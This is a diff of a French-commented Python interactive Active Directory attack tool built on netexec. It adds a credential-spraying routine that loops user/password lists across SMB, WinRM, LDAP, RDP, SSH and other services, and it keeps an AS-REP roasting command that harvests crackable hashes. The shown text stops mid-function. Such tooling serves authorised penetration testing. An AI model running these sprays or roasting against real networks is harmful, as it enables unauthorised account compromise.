@@ -11,6 +11,7 @@ import sys
 import subprocess
 import shutil
 import re
+import os
 
 try:
     from prompt_toolkit import PromptSession
@@ -75,6 +76,17 @@ credentials = {
     "username": None,
     "password": None,
     "domain": None
+}
+
+# Nouvelle structure pour les tests d'identifiants multiples
+multi_credentials = {
+    "users": [],
+    "passwords": [],
+    "hashes": [],
+    "users_file": None,
+    "passwords_file": None,
+    "hashes_file": None,
+    "domain": None # Le domaine est partagé
 }
 
 # --- Fonctions Utilitaires ---
@@ -159,25 +171,34 @@ def run_preliminary_scan(target_ip, scanned_ports_info, session):
     # Vérifier si le port LDAP est ouvert avant de tester
     if 389 in scanned_ports_info.get("LDAP", []): # Accès corrigé
         print("[*] Test de la liaison LDAP anonyme...")
-        # Utilisation de nxc pour une tentative de connexion anonyme simple
-        # et récupération du nom de domaine si possible.
-        # La commande exacte peut varier ou nécessiter des ajustements.
-        # nxc ldap <target> -u '' -p '' --trusted-domain
-        # ou nxc ldap <target> -u '' -p '' --namingcontexts
-        cmd_ldap_anon = [NXC_CMD, "ldap", target_ip, "-u", "''", "-p", "''", "--trusted-domain"]
+        # Remplacement de --trusted-domain par --namingcontexts ou une simple vérification
+        # cmd_ldap_anon = [NXC_CMD, "ldap", target_ip, "-u", "''", "-p", "''", "--trusted-domain"]
+        cmd_ldap_anon = [NXC_CMD, "ldap", target_ip, "-u", "", "-p", "", "--info"] # --info est plus général
         output, ret_code = run_command(cmd_ldap_anon)
-        if output and "DOMAIN" in output.upper(): # Chercher un indicateur de succès
+
+        # Une meilleure vérification du succès pour la liaison anonyme
+        # Souvent, si la commande ne retourne pas d'erreur explicite de login et affiche des infos, c'est un succès.
+        # Pour nxc, une absence d'erreur et la présence d'informations de base est un bon signe.
+        if ret_code == 0 and output: # Si la commande s'exécute sans erreur et retourne quelque chose
             ldap_anon_success = True
             # Essayer d'extraire le nom de domaine (simpliste)
-            match = re.search(r"Domain:\s*([\w.-]+)", output, re.IGNORECASE)
-            if match:
-                ldap_domain_name = match.group(1)
-            elif "dnsdomainname" in output.lower(): # Autre tentative
-                 match_dns = re.search(r"dnsdomainname:\s*([\w.-]+)", output, re.IGNORECASE)
-                 if match_dns:
-                     ldap_domain_name = match_dns.group(1)
+            match_dns_domain = re.search(r"Domain:\s*([\w.-]+)", output, re.IGNORECASE)
+            if match_dns_domain:
+                ldap_domain_name = match_dns_domain.group(1)
+            else:
+                # Tenter d'extraire de defaultNamingContext ou dNSHostName
+                match_naming_context = re.search(r"defaultNamingContext:\s*(DC=[\w,-]+)", output, re.IGNORECASE)
+                if match_naming_context:
+                    ldap_domain_name = match_naming_context.group(1).replace("DC=", "").replace(",", ".")
+                else:
+                    match_host = re.search(r"dNSHostName:\s*([\w.-]+)", output, re.IGNORECASE)
+                    if match_host:
+                        # Ceci est le FQDN de la machine, pas nécessairement le domaine AD, mais mieux que rien
+                        ldap_domain_name = ".".join(match_host.group(1).split('.')[1:]) if '.' in match_host.group(1) else match_host.group(1)
+            if ldap_domain_name == "N/A" and "namingContexts" in output: # Fallback si on a des naming contexts
+                ldap_domain_name = "Infos NamingContext trouvées"
 
-    results.append(("LDAP Anonyme", ldap_anon_success, f"Domaine: {ldap_domain_name}" if ldap_anon_success else "Échec de la liaison ou infos non trouvées"))
+    results.append(("LDAP Anonyme", ldap_anon_success, f"Domaine/Infos: {ldap_domain_name}" if ldap_anon_success else "Échec de la liaison ou infos non trouvées"))
 
     # 2. Test de connexion SMB anonyme (Null Session) & Listage des partages
     smb_anon_success = False
@@ -589,194 +610,104 @@ def ldap_menu_help():
     print("  back                - Retourner au menu principal.")
 
 
-def explore_ldap(target_ip, ports, main_session):
-    logging.info(f"Entrée dans le menu d'exploration LDAP pour {target_ip}:{ports}")
-    if not NXC_AVAILABLE:
-        print("[-] La commande 'nxc' (netexec) n'est pas disponible. L'exploration LDAP avancée est limitée.")
-
-    ldap_completer = WordCompleter([
-        "testuser", "enumusers", "query", "asreproast", "kerberoast", "finddelegation", "info", "help", "back"
-    ], ignore_case=True)
+def explore_ldap(target_ip, ldap_ports, session):
+    """Menu interactif pour explorer les services LDAP/LDAPS."""
+    ldap_menu_prompt = f"ADExplorer ({AnsiColors.YELLOW}{target_ip}{AnsiColors.ENDC}/LDAP)> "
     
-    ldap_session = PromptSession(history=FileHistory('.ad_explorer_ldap_history'), auto_suggest=AutoSuggestFromHistory(), style=cli_style)
+    ldap_commands_help = {
+        "help": "Afficher ce message d'aide.",
+        "query <filter> [attributes]": "Effectuer une requête LDAP (ex: query \"(objectClass=user)\" sAMAccountName displayName).",
+        "asreproast <output_file.txt>": "Tenter une attaque AS-REP Roasting.",
+        "back": "Retourner au menu précédent."
+    }
+    # Pour NestedCompleter, les commandes finales ont None comme valeur
+    ldap_commands_completer = {
+        "help": None,
+        "query": None, # L'utilisateur tapera le filtre ensuite
+        "asreproast": None, # L'utilisateur tapera le nom du fichier
+        "back": None,
+    }
+    ldap_completer = NestedCompleter.from_nested_dict(ldap_commands_completer)
 
-    print(f"\n[*] Exploration LDAP sur {target_ip} (ports: {', '.join(map(str, ports))}). Tapez 'help' pour les options.")
-    is_ldaps = 636 in ports or 3269 in ports # Global Catalog LDAPS
-    protocol = "ldaps" if is_ldaps else "ldap"
+    print_target_menu(ldap_commands_help)
 
     while True:
         try:
-            action = ldap_session.prompt(f"LDAP ({target_ip})> ", completer=ldap_completer).strip().lower()
-            if not action:
+            ldap_input = session.prompt(
+                ldap_menu_prompt,
+                completer=ldap_completer,
+                auto_suggest=AutoSuggestFromHistory(),
+                style=cli_style
+            ).strip()
+
+            if not ldap_input:
                 continue
-            
-            cmd_parts = action.split()
-            command = cmd_parts[0]
 
-            # Commandes de base nxc pour LDAP
-            base_nxc_cmd = ["nxc", protocol, target_ip]
-            auth_nxc_cmd = []
-            if credentials["username"]: # Peut être vide pour certaines actions
-                auth_nxc_cmd.extend(["-u", credentials["username"]])
-                if credentials["password"]: # Peut être vide pour certaines actions
-                     auth_nxc_cmd.extend(["-p", credentials["password"]])
-                if credentials["domain"]:
-                    auth_nxc_cmd.extend(["-d", credentials["domain"]])
-
+            parts = ldap_input.split()
+            command = parts[0].lower()
+            args = parts[1:]
 
             if command == "back":
-                logging.info(f"Sortie du menu LDAP pour {target_ip}")
                 break
             elif command == "help":
-                ldap_menu_help()
-            elif command == "info":
-                print(f"[*] Récupération des informations de base du domaine (NamingContexts) via {protocol}...")
-                if NXC_AVAILABLE:
-                    # NXC ne semble pas avoir une commande directe pour juste le naming context sans auth simple
-                    # On peut utiliser une requête simple ou se fier à ce que nxc affiche par défaut
-                    run_command(base_nxc_cmd + auth_nxc_cmd) # Affiche des infos de base si connexion ok
-                else:
-                    print("[-] Commande 'nxc' non disponible.")
-                    print("    Alternative: ldapsearch -x -H ldap://{target_ip} -s base namingcontexts")
-
-            elif command == "testuser":
-                if len(cmd_parts) < 2:
-                    print("Usage: testuser <users_file_path> [network_range/target_ip]")
+                print_target_menu(ldap_commands_help)
+            elif command == "query":
+                if len(args) < 2:
+                    print("Usage: query <ldap_filter> <attributes>")
                     continue
-                users_file = cmd_parts[1]
-                target_range = cmd_parts[2] if len(cmd_parts) > 2 else target_ip
-                print(f"[*] Test d'existence de comptes depuis '{users_file}' sur '{target_range}' via {protocol} (sans Kerberos)...")
+                ldap_filter = args[0]
+                attributes = args[1]
+                print(f"[*] Exécution de la requête LDAP via ldap: Filtre='{ldap_filter}', Attributs='{attributes}'...")
                 if NXC_AVAILABLE:
-                    # nxc ldap <network_range> -u <users_file> -p '' -k (le -k est pour kerberos auth, on veut sans ici)
-                    # Pour tester l'existence sans password, on peut juste passer -u <file> -p ''
-                    # Le prompt original disait "-k" mais c'est pour "use kerberos auth", ce qui n'est pas le but ici.
-                    # On va supposer que l'on teste si les comptes existent et sont accessibles anonymement ou avec un mot de passe vide.
-                    run_command(["nxc", protocol, target_range, "-u", users_file, "-p", "''"])
+                    run_command(["nxc", "ldap", target_ip, "-u", "", "-p", "", "--ldap-filter", ldap_filter, "--attributes", attributes])
                 else:
-                    print("[-] Commande 'nxc' non disponible.")
-
-            elif command == "enumusers":
-                if not credentials["username"] or not credentials["password"]: # Souvent nécessaire pour une énumération complète
-                    print("[-] Des identifiants (utilisateur/mot de passe) sont généralement requis pour une énumération complète des utilisateurs.")
-                    print("    Utilisez 'set user' et 'set pass' dans le menu principal.")
-                    # On peut quand même tenter une énumération anonyme si l'utilisateur le souhaite
-                    confirm_anon = get_user_input(ldap_session, "Tenter une énumération anonyme ? (oui/non): ", default="non").lower()
-                    if confirm_anon != 'oui':
+                    print(f"    Alternative: ldapsearch -x -H ldap://{target_ip} -D \"{credentials['domain']}\\{credentials['username']}\" -w \"{credentials['password']}\" -b \"<base_dn>\" \"{ldap_filter}\" {attributes}")
+            elif command == "asreproast":
+                if not args:
+                    print("Usage: asreproast <output_file.txt>")
+                    continue
+                output_file = args[0]
+                # Déterminer si SSL doit être utilisé en fonction des ports
+                use_ssl = 636 in ldap_ports or 3269 in ldap_ports
+                
+                # Le domaine est nécessaire pour AS-REP Roasting.
+                # Utiliser le domaine globalement défini dans multi_credentials ou credentials
+                # Ou demander à l'utilisateur s'il n'est pas défini.
+                domain_to_use = multi_credentials.get("domain") or credentials.get("domain")
+                if not domain_to_use:
+                    try:
+                        domain_to_use = session.prompt(
+                            "Veuillez entrer le nom de domaine cible pour AS-REP Roasting (ex: contoso.local): ",
+                            style=cli_style
+                        ).strip()
+                        if not domain_to_use:
+                            print("[-] Nom de domaine requis pour AS-REP Roasting.")
+                            continue
+                    except (KeyboardInterrupt, EOFError):
+                        print("\nOpération annulée.")
                         continue
                 
-                output_file = cmd_parts[1] if len(cmd_parts) > 1 else f"ldap_users_{target_ip}.txt"
-                print(f"[*] Énumération de tous les utilisateurs via {protocol} (sortie: {output_file})...")
-                if NXC_AVAILABLE:
-                    cmd_to_run = base_nxc_cmd + auth_nxc_cmd + ["--users"] # --users-export n'existe plus, --users suffit et logue
-                    # NXC logue la sortie dans son propre système de logs.
-                    # On peut ajouter --logfile pour rediriger spécifiquement si besoin.
-                    print(f"    Les résultats seront dans les logs de nxc ou affichés ci-dessous.")
-                    run_command(cmd_to_run)
-                    print(f"    Note: nxc enregistre souvent les résultats dans ~/.nxc/logs/ ou un dossier similaire.")
-                else:
-                    print("[-] Commande 'nxc' non disponible.")
-
-            elif command == "query":
-                if len(cmd_parts) < 3:
-                    print("Usage: query \"<ldap_filter>\" \"<attributes_to_return>\"")
-                    print("Exemple: query \"(objectClass=user)\" \"sAMAccountName description\"")
-                    continue
-                if not credentials["username"] or not credentials["password"]:
-                    print("[-] Des identifiants (utilisateur/mot de passe) sont requis pour les requêtes LDAP authentifiées.")
-                    continue
+                print(f"[*] Tentative d'AS-REP Roasting sur {target_ip} pour le domaine {domain_to_use}. Sortie vers {output_file}")
+                # nxc ldap <target> [-d <domain>] --asreproast <file> [--ssl si port 636/3269]
+                # nxc ne prend pas -u/-p pour asreproast car il cible les comptes sans pré-auth Kerberos
+                cmd_asrep = [NXC_CMD, "ldap", target_ip, "-d", domain_to_use, "--asreproast", output_file]
+                if use_ssl:
+                    cmd_asrep.append("--ssl")
                 
-                ldap_filter = cmd_parts[1]
-                attributes = cmd_parts[2]
-                print(f"[*] Exécution de la requête LDAP via {protocol}: Filtre='{ldap_filter}', Attributs='{attributes}'...")
-                if NXC_AVAILABLE:
-                    # nxc ldap <target_ip> -u <username> -p <password> --query "<filter>" "<attributes>"
-                    # La doc de nxc pour --query est un peu floue, il semble que ce soit --ldap-filter et --attributes
-                    # Après vérification, nxc utilise --ldap-filter et --attributes
-                    # Cependant, le prompt initial demandait --query. Je vais essayer de trouver la bonne syntaxe pour nxc.
-                    # Il semble que nxc n'ait pas une option --query directe comme l'ancien crackmapexec.
-                    # On peut utiliser le module `ldap` de nxc avec l'action `query`.
-                    # nxc ldap <target> -u <user> -p <pass> -M ldap-query -o FILTER="<filter>" ATTRS="<attrs>"
-                    # Pour l'instant, je vais indiquer que cette fonctionnalité nécessite une adaptation pour nxc.
-                    print("    Note: La syntaxe exacte pour les requêtes LDAP brutes avec nxc peut varier.")
-                    print("    Vous pourriez avoir besoin d'utiliser le module 'ldap-query' de nxc.")
-                    print(f"    Exemple potentiel: nxc {protocol} {target_ip} {' '.join(auth_nxc_cmd)} -M ldap-query -o FILTER='{ldap_filter}' ATTRS='{attributes}'")
-                    # Tentative avec une approche plus simple si disponible
-                    # run_command(base_nxc_cmd + auth_nxc_cmd + ["--ldap-filter", ldap_filter, "--attributes", attributes])
-                    print("    Cette fonctionnalité de requête directe via nxc CLI est en cours de clarification.")
+                run_command(cmd_asrep, capture_output=False) # Afficher la sortie en direct
 
-                else:
-                    print("[-] Commande 'nxc' non disponible.")
-                    print(f"    Alternative: ldapsearch -x -H {protocol}://{target_ip} -D \"{credentials['domain']}\\{credentials['username']}\" -w \"{credentials['password']}\" -b \"<base_dn>\" \"{ldap_filter}\" {attributes}")
-
-
-            elif command == "asreproast":
-                output_file = cmd_parts[1] if len(cmd_parts) > 1 else f"asreproast_{target_ip}.txt"
-                print(f"[*] Tentative d'AS-REP Roasting via {protocol} (sortie: {output_file})...")
-                if NXC_AVAILABLE:
-                    # nxc ldap <target_ip> -u <username_ou_liste> -p '' --asreproast output.txt
-                    # Si des identifiants sont fournis, nxc les utilisera pour se lier d'abord, puis chercher les comptes AS-REP Roastable
-                    # Si aucun identifiant n'est fourni, il essaiera une liaison anonyme pour trouver les comptes.
-                    # Le prompt demande -u <username> -p '' pour sans auth, ce qui est correct pour cibler un utilisateur spécifique sans mdp
-                    # ou -u <username> -p <password> pour une liaison authentifiée avant de chercher.
-                    
-                    cmd_to_run = base_nxc_cmd
-                    if credentials["username"]: # Si un utilisateur est spécifié pour la liaison
-                        cmd_to_run += ["-u", credentials["username"]]
-                        cmd_to_run += ["-p", credentials["password"] if credentials["password"] else "''"]
-                    else: # Tentative anonyme ou avec une liste d'utilisateurs (si on l'implémente)
-                         # Pour une recherche générale, on peut omettre -u et -p si le serveur le permet,
-                         # ou fournir un utilisateur valide pour la liaison.
-                         # NXC va essayer de trouver les utilisateurs vulnérables.
-                         print("    Utilisation des identifiants globaux si définis, sinon tentative anonyme.")
-                         cmd_to_run += auth_nxc_cmd # Ajoute user/pass/domaine s'ils sont définis
-
-                    cmd_to_run += ["--asreproast", output_file]
-                    run_command(cmd_to_run)
-                    print(f"    Les résultats (hashs) devraient être dans '{output_file}' si des comptes vulnérables sont trouvés.")
-                else:
-                    print("[-] Commande 'nxc' non disponible.")
-
-            elif command == "kerberoast":
-                if not credentials["username"] or not credentials["password"]:
-                    print("[-] Des identifiants (utilisateur/mot de passe) sont requis pour le Kerberoasting.")
-                    continue
-                output_file = cmd_parts[1] if len(cmd_parts) > 1 else f"kerberoast_{target_ip}.txt"
-                print(f"[*] Tentative de Kerberoasting via {protocol} (sortie: {output_file})...")
-                if NXC_AVAILABLE:
-                    cmd_to_run = base_nxc_cmd + auth_nxc_cmd + ["--kerberoasting", output_file]
-                    run_command(cmd_to_run)
-                    print(f"    Les résultats (hashs) devraient être dans '{output_file}' si des SPNs sont trouvés.")
-                else:
-                    print("[-] Commande 'nxc' non disponible.")
-
-            elif command == "finddelegation":
-                if not credentials["username"] or not credentials["password"]:
-                    print("[-] Des identifiants (utilisateur/mot de passe) sont requis pour trouver les délégations.")
-                    continue
-                print(f"[*] Recherche de délégations mal configurées via {protocol}...")
-                if NXC_AVAILABLE:
-                    # nxc ldap <target_ip> -u <username> -p <password> --find-delegation
-                    # Cette option n'existe pas directement dans nxc.
-                    # On pourrait utiliser des requêtes LDAP spécifiques ou des modules nxc dédiés si disponibles.
-                    # Par exemple, le module `delegation` de nxc.
-                    # nxc ldap <target> -u <user> -p <pass> -M delegation
-                    print("    Utilisation du module 'delegation' de nxc (si disponible et configuré)...")
-                    run_command(base_nxc_cmd + auth_nxc_cmd + ["-M", "delegation"])
-                    # Alternativement, des filtres LDAP manuels :
-                    # Unconstrained: (userAccountControl:1.2.840.113556.1.4.803:=524288)
-                    # Constrained: (msDS-AllowedToDelegateTo=*)
-                    # Resourced-based Constrained: (msDS-AllowedToActOnBehalfOfOtherIdentity=*)
-                    print("    Vous pouvez aussi utiliser des filtres LDAP manuels avec la commande 'query':")
-                    print("    query \"(userAccountControl:1.2.840.113556.1.4.803:=524288)\" \"sAMAccountName\" (Non contrainte)")
-                    print("    query \"(msDS-AllowedToDelegateTo=*)\" \"sAMAccountName msDS-AllowedToDelegateTo\" (Contrainte)")
-                else:
-                    print("[-] Commande 'nxc' non disponible.")
             else:
-                print(f"Commande LDAP inconnue: {command}. Tapez 'help'.")
+                print(f"Commande LDAP inconnue: {command}")
 
-        except (KeyboardInterrupt, EOFError):
-            print("\n[!] Action annulée dans le menu LDAP.")
-            continue
+        except KeyboardInterrupt:
+            print("\nRetour au menu précédent (Ctrl+C)")
+            break
+        except EOFError:
+            print("\nRetour au menu précédent (Ctrl+D)")
+            break
+        except Exception as e:
+            logging.error(f"Erreur dans le menu LDAP: {e}", exc_info=True)
+            print(f"Erreur: {e}")
 
 def rpc_menu_help():
     print("\nCommandes d'exploration RPC disponibles:")
@@ -939,17 +870,17 @@ def main_loop(target_ip, scanned_ports, session):
     # Dictionnaire des commandes pour l'affichage de l'aide
     target_commands_help = {
         "help": "Afficher ce message d'aide.",
-        "prelim_scan": "Effectuer un scan préliminaire rapide (LDAP/SMB anonyme, ports AD).",
-        "smb": "Explorer les services SMB (nécessite une cible SMB).",
-        "ldap": "Explorer les services LDAP/LDAPS (nécessite une cible LDAP).",
+        "prelim_scan": "Effectuer un scan préliminaire rapide.",
+        "smb": "Explorer les services SMB.",
+        "ldap": "Explorer les services LDAP/LDAPS.",
         "discoverusers": "Tenter différentes techniques de découverte d'utilisateurs.",
-        "services": "Afficher les services détectés lors du scan initial.",
-        "set user <username>": "Définir le nom d'utilisateur pour les actions futures.",
-        "set password <password>": "Définir le mot de passe pour les actions futures.",
-        "set domain <domain>": "Définir le domaine pour les actions futures.",
-        "creds": "Afficher les identifiants actuellement configurés.",
+        "services": "Afficher les services détectés.",
+        "set user <username>": "Définir l'utilisateur unique pour certaines actions.",
+        "set password <password>": "Définir le mot de passe unique.",
+        "set domain <domain_name>": "Définir le domaine (pour identifiants uniques ET multiples).",
+        "creds": "Afficher les identifiants configurés (uniques et multiples).",
         "clear creds": "Effacer tous les identifiants configurés.",
-        "back": "Retourner au menu principal (si applicable, sinon quitte).",
+        "back": "Quitter la session cible actuelle.",
         "exit": "Quitter l'application."
     }
 
@@ -957,14 +888,20 @@ def main_loop(target_ip, scanned_ports, session):
     target_commands_completer_dict = {
         "help": None,
         "prelim_scan": None,
-        "smb": None, # Si SMB avait des sous-commandes, elles seraient ici
-        "ldap": None, # Idem pour LDAP
+        "smb": None,
+        "ldap": None,
         "discoverusers": None,
         "services": None,
         "set": {
             "user": None,
             "password": None,
-            "domain": None
+            "domain": None,
+            "users": None,
+            "usersfile": None,
+            "passwords": None,
+            "passwordsfile": None,
+            "hashes": None,
+            "hashesfile": None,
         },
         "creds": None,
         "clear": {
@@ -1021,31 +958,27 @@ def main_loop(target_ip, scanned_ports, session):
                 print("Retour... (quitte la session cible actuelle)")
                 break
             elif command == "help":
-                print_target_menu(target_commands_help) # Utiliser le dictionnaire d'aide ici
+                print_target_menu(target_commands_help)
             elif command == "prelim_scan":
                 run_preliminary_scan(target_ip, scanned_ports, session)
             elif command == "smb":
-                smb_ports_list = scanned_ports.get("SMB", []) # Récupérer la liste des ports SMB
+                smb_ports_list = scanned_ports.get("SMB", [])
                 if not smb_ports_list:
-                    # Correction: Le message d'erreur était incorrect.
-                    # Il n'y a pas de <service_name> à passer ici.
-                    # La commande 'smb' explore les ports SMB déjà identifiés.
                     print(f"[-] Aucun port SMB (139, 445) n'a été détecté sur {target_ip}.")
                     logging.warning(f"Tentative d'exploration SMB sans ports SMB détectés pour {target_ip}")
                     continue
                 explore_smb(target_ip, smb_ports_list, session)
             elif command == "ldap":
-                ldap_ports_list = scanned_ports.get("LDAP", []) # Récupérer la liste des ports LDAP
-                ldaps_ports_list = scanned_ports.get("LDAPS", []) # Et LDAPS
+                ldap_ports_list = scanned_ports.get("LDAP", [])
+                ldaps_ports_list = scanned_ports.get("LDAPS", [])
                 
                 combined_ldap_ports = ldap_ports_list + ldaps_ports_list
                 
                 if not combined_ldap_ports:
-                    # Message d'erreur corrigé
                     print(f"[-] Aucun port LDAP (389) ou LDAPS (636) n'a été détecté sur {target_ip}.")
                     logging.warning(f"Tentative d'exploration LDAP sans ports LDAP/LDAPS détectés pour {target_ip}")
                     continue
-                explore_ldap(target_ip, combined_ldap_ports, session) # Passer tous les ports LDAP/S
+                explore_ldap(target_ip, combined_ldap_ports, session)
             elif command == "discoverusers":
                 user_discovery_mode(target_ip, session)
             elif command == "services":
@@ -1057,38 +990,107 @@ def main_loop(target_ip, scanned_ports, session):
                     print("  Aucun service n'a été détecté lors du scan initial.")
             elif command == "set":
                 if len(command_parts) > 2:
-                    cred_type = command_parts[1]
-                    value = " ".join(command_parts[2:])
-                    if cred_type == "user":
+                    set_type = command_parts[1].lower()
+                    value_parts = command_parts[2:]
+                    value = " ".join(value_parts)
+
+                    if set_type == "user":
                         credentials["username"] = value
-                        print(f"Nom d'utilisateur défini sur : {value}")
-                        logging.info(f"Identifiant username défini.")
-                    elif cred_type == "password":
+                        print(f"Utilisateur unique défini sur : {value}")
+                        logging.info(f"Identifiant unique 'username' défini.")
+                    elif set_type == "password":
                         credentials["password"] = value
-                        print("Mot de passe défini.")
-                        logging.info(f"Identifiant password défini.")
-                    elif cred_type == "domain":
+                        print("Mot de passe unique défini.")
+                        logging.info(f"Identifiant unique 'password' défini.")
+                    elif set_type == "domain":
                         credentials["domain"] = value
+                        multi_credentials["domain"] = value
                         print(f"Domaine défini sur : {value}")
-                        logging.info(f"Identifiant domain défini.")
+                        logging.info(f"Domaine '{value}' défini.")
+                    elif set_type == "users":
+                        multi_credentials["users"] = [u.strip() for u in value.split(',')]
+                        multi_credentials["users_file"] = None
+                        print(f"Liste d'utilisateurs définie ({len(multi_credentials['users'])} utilisateurs).")
+                        logging.info("Liste d'utilisateurs pour multi_credentials définie.")
+                    elif set_type == "usersfile":
+                        if os.path.isfile(value):
+                            multi_credentials["users_file"] = value
+                            multi_credentials["users"] = []
+                            print(f"Fichier d'utilisateurs défini sur : {value}")
+                            logging.info(f"Fichier d'utilisateurs '{value}' pour multi_credentials défini.")
+                        else:
+                            print(f"[-] Erreur: Fichier '{value}' introuvable.")
+                    elif set_type == "passwords":
+                        multi_credentials["passwords"] = [p.strip() for p in value.split(',')]
+                        multi_credentials["passwords_file"] = None
+                        print(f"Liste de mots de passe définie ({len(multi_credentials['passwords'])} mots de passe).")
+                        logging.info("Liste de mots de passe pour multi_credentials définie.")
+                    elif set_type == "passwordsfile":
+                        if os.path.isfile(value):
+                            multi_credentials["passwords_file"] = value
+                            multi_credentials["passwords"] = []
+                            print(f"Fichier de mots de passe défini sur : {value}")
+                            logging.info(f"Fichier de mots de passe '{value}' pour multi_credentials défini.")
+                        else:
+                            print(f"[-] Erreur: Fichier '{value}' introuvable.")
+                    elif set_type == "hashes":
+                        multi_credentials["hashes"] = [h.strip() for h in value.split(',')]
+                        multi_credentials["hashes_file"] = None
+                        print(f"Liste de hashes définie ({len(multi_credentials['hashes'])} hashes).")
+                        logging.info("Liste de hashes pour multi_credentials définie.")
+                    elif set_type == "hashesfile":
+                        if os.path.isfile(value):
+                            multi_credentials["hashes_file"] = value
+                            multi_credentials["hashes"] = []
+                            print(f"Fichier de hashes défini sur : {value}")
+                            logging.info(f"Fichier de hashes '{value}' pour multi_credentials défini.")
+                        else:
+                            print(f"[-] Erreur: Fichier '{value}' introuvable.")
                     else:
-                        print("Usage: set <user|password|domain> <valeur>")
+                        print("Usage: set <user|password|domain|users|usersfile|passwords|passwordsfile|hashes|hashesfile> <valeur>")
                 else:
-                    print("Usage: set <user|password|domain> <valeur>")
+                    print("Usage: set <type> <valeur>")
             
             elif command == "creds":
-                print("[*] Identifiants actuels :")
-                print(f"  Nom d'utilisateur : {credentials['username'] if credentials['username'] else 'Non défini'}")
-                print(f"  Mot de passe      : {'********' if credentials['password'] else 'Non défini'}")
-                print(f"  Domaine           : {credentials['domain'] if credentials['domain'] else 'Non défini'}")
+                print("[*] Identifiants uniques configurés :")
+                print(f"  Utilisateur unique : {credentials['username'] if credentials['username'] else 'Non défini'}")
+                print(f"  Mot de passe unique: {'********' if credentials['password'] else 'Non défini'}")
+                
+                print("\n[*] Identifiants multiples configurés pour 'testcreds':")
+                print(f"  Domaine            : {multi_credentials['domain'] if multi_credentials['domain'] else 'Non défini'}")
+                if multi_credentials["users_file"]:
+                    print(f"  Fichier utilisateurs: {multi_credentials['users_file']}")
+                else:
+                    print(f"  Utilisateurs (liste): {', '.join(multi_credentials['users']) if multi_credentials['users'] else 'Non défini'}")
+                
+                if multi_credentials["passwords_file"]:
+                    print(f"  Fichier mots de passe: {multi_credentials['passwords_file']}")
+                else:
+                    print(f"  Mots de passe (liste): {'Présents' if multi_credentials['passwords'] else 'Non défini'}")
+
+                if multi_credentials["hashes_file"]:
+                    print(f"  Fichier hashes     : {multi_credentials['hashes_file']}")
+                else:
+                    print(f"  Hashes (liste)     : {'Présents' if multi_credentials['hashes'] else 'Non défini'}")
 
             elif command == "clear" and len(command_parts) > 1 and command_parts[1] == "creds":
                 credentials["username"] = None
                 credentials["password"] = None
                 credentials["domain"] = None
-                print("[*] Identifiants effacés.")
-                logging.info("Identifiants effacés.")
+                multi_credentials["domain"] = None
+                
+                multi_credentials["users"] = []
+                multi_credentials["passwords"] = []
+                multi_credentials["hashes"] = []
+                multi_credentials["users_file"] = None
+                multi_credentials["passwords_file"] = None
+                multi_credentials["hashes_file"] = None
+                print("[*] Tous les identifiants (uniques et multiples) ont été effacés.")
+                logging.info("Tous les identifiants effacés.")
             
+            elif command == "testcreds":
+                run_credential_tests(target_ip, scanned_ports, multi_credentials, session)
+
             else:
                 print(f"Commande inconnue: {command}. Tapez 'help' pour la liste des commandes.")
 
@@ -1096,13 +1098,138 @@ def main_loop(target_ip, scanned_ports, session):
             logging.warning("Sortie demandée par l'utilisateur (Ctrl+C)")
             print("\nAu revoir ! (Ctrl+C détecté)")
             break
-        except EOFError: # Ctrl+D
+        except EOFError:
             logging.warning("Sortie demandée par l'utilisateur (Ctrl+D)")
             print("\nAu revoir ! (Ctrl+D détecté)")
             break
         except Exception as e:
             logging.error(f"Une erreur inattendue est survenue: {e}", exc_info=True)
             print(f"Erreur: {e}")
+
+def load_items_from_file(filepath):
+    """Charge une liste d'éléments depuis un fichier (un élément par ligne)."""
+    if filepath and os.path.isfile(filepath):
+        try:
+            with open(filepath, 'r', encoding='utf-8') as f:
+                return [line.strip() for line in f if line.strip()]
+        except Exception as e:
+            print(f"[-] Erreur lors de la lecture du fichier {filepath}: {e}")
+            logging.error(f"Erreur lecture fichier {filepath}: {e}")
+    return []
+
+def run_credential_tests(target_ip, scanned_services_ports, cred_config, session):
+    """
+    Exécute des tentatives d'authentification sur les services détectés
+    en utilisant les listes d'utilisateurs, mots de passe et hashes fournies.
+    """
+    logging.info(f"Lancement des tests d'identifiants sur {target_ip}")
+    print(f"\n[*] Lancement des tests d'identifiants sur {target_ip}...")
+
+    users_to_test = cred_config["users"]
+    if cred_config["users_file"]:
+        users_to_test.extend(load_items_from_file(cred_config["users_file"]))
+    
+    passwords_to_test = cred_config["passwords"]
+    if cred_config["passwords_file"]:
+        passwords_to_test.extend(load_items_from_file(cred_config["passwords_file"]))
+
+    hashes_to_test = cred_config["hashes"]
+    if cred_config["hashes_file"]:
+        hashes_to_test.extend(load_items_from_file(cred_config["hashes_file"]))
+
+    domain = cred_config["domain"]
+
+    if not users_to_test:
+        print("[-] Aucune liste d'utilisateurs à tester. Configurez avec 'set users' ou 'set usersfile'.")
+        return
+    if not passwords_to_test and not hashes_to_test:
+        print("[-] Aucune liste de mots de passe ou de hashes à tester. Configurez avec 'set passwords/hashes' ou 'set passwordsfile/hashesfile'.")
+        return
+
+    successful_logins = []
+
+    protocols_to_test_map = {
+        "SMB": "smb",
+        "WinRM_HTTP": "winrm",
+        "WinRM_HTTPS": "winrm",
+        "LDAP": "ldap",
+        "LDAPS": "ldap",
+        "MSSQL": "mssql",
+        "RDP": "rdp",
+        "SSH": "ssh",
+        "FTP": "ftp",
+    }
+
+    for service_name, ports in scanned_services_ports.items():
+        if not ports:
+            continue
+        
+        nxc_protocol = protocols_to_test_map.get(service_name)
+        if not nxc_protocol:
+            logging.info(f"Pas de mapping nxc pour le service '{service_name}', ignoré pour testcreds.")
+            continue
+
+        print(f"\n--- Test du service: {service_name} (Protocole nxc: {nxc_protocol}) sur les ports {ports} ---")
+
+        for user in set(users_to_test):
+            if not user: continue
+
+            for password in set(passwords_to_test):
+                if not password: continue
+                
+                print(f"  [>] Test: {user} / {password[:2]}** (domaine: {domain if domain else 'local'}) sur {service_name}")
+                cmd = [NXC_CMD, nxc_protocol, target_ip, "-u", user, "-p", password]
+                if domain:
+                    cmd.extend(["-d", domain])
+                if nxc_protocol == "ldap" and (636 in ports or 3269 in ports):
+                    cmd.append("--ssl")
+                
+                if nxc_protocol == "smb": cmd.append("--shares")
+
+                output, ret_code = run_command(cmd, capture_output=True)
+
+                if output and "(Pwn3d!)" in output:
+                    success_detail = f"Service: {service_name}, User: {user}, Pass: {password}"
+                    print(f"    {AnsiColors.GREEN}[+] SUCCÈS (Pwn3d!): {success_detail}{AnsiColors.ENDC}")
+                    successful_logins.append(success_detail)
